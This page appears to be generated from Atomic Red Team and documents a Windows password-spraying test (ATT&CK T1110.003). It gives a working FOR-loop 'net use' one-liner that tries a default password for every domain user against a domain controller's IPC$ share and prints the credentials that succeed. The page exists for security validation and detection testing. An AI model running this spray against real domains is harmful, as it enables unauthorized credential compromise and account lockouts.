---
atomic_guid: "90bc2e54-6c84-47a5-9439-0a2a92b4b175"
title: "Password Spray all Domain Users"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "90bc2e54-6c84-47a5-9439-0a2a92b4b175"
  - "Password Spray all Domain Users"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.
This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.
Use the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.
See the "Windows FOR Loop Password Spraying Made Easy" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force#^t1110003-password-spraying|T1110.003: Password Spraying]]

## Input Arguments

### password

- description: The password to try for each user in users.txt
- type: string
- default: Spring2020

## Dependencies

List of domain users to password spray must exits at %temp%\users.txt

### Prerequisite Check

```untitled
if not exist %temp%\users.txt (exit /b 1)
```

### Get Prerequisite

```untitled
"PathToAtomicsFolder\T1110.003\src\parse_net_users.bat"
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
